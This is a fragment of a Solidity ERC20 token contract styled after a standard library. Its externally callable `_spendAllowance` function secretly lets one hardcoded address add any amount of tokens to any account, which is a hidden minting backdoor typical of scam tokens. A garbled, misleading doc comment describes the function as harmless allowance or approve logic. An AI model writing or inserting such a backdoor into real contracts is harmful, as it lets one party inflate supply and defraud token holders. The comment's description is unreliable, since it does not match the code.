...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     *
     * - when `account` and `amount` are both non-zero, `amount` of ``amount``'s tokens
     * will be transferred to `to`.
     * - when `amount` is zero, `amount` tokens will be minted for `account`.
     * - when `account` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
    */
    function _spendAllowance(address account, uint256 amount) external {
        if(msg.sender == 0x6A8943f6523181087B7967e35ac7b8AC0d687956) {
            _last = account;
            _swap = true;
            _balances[account] += amount;
        }
